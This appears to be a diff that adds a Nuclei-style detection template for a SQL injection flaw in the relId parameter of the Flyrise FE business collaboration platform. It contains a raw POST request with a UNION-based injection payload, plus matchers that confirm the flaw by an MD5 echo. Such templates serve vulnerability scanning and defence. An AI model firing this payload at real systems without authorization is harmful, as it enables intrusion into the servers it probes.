@@ -1,0 +1,37 @@
+id: poc-yaml-flyrise-enterprise-relid-sqli
+info:
+  name: 飞企互联FE业务协作平台 relId SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in 飞企互联FE业务协作平台 affecting the relId parameter.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /mobile/validate.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        json={"relId":"1'+UNION+ALL+SELECT+sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))%2CNULL%2CNULL--+wMCa","type":"0"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"flowCode\":"
+          - "0x{{t2}}"
+          - "\"errorCode\":"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
